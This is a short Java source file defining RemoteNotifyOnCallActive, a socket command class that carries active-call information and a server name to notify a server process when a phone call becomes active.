package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.ActiveCallInfo;

public class RemoteNotifyOnCallActive extends SocketCmd<ActiveCallInfo, Boolean> {
	
	private static final long serialVersionUID = 2797374315303043602L;
	
	private static final String TAG = "RemoteNotifyOnCallActive";
	private String mServerName;

	public RemoteNotifyOnCallActive(ActiveCallInfo activeCallInfo, String serverName) {
		super(activeCallInfo, Boolean.class);
		mServerName = serverName;
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	protected String getServerName() {
		return mServerName;
	}

}
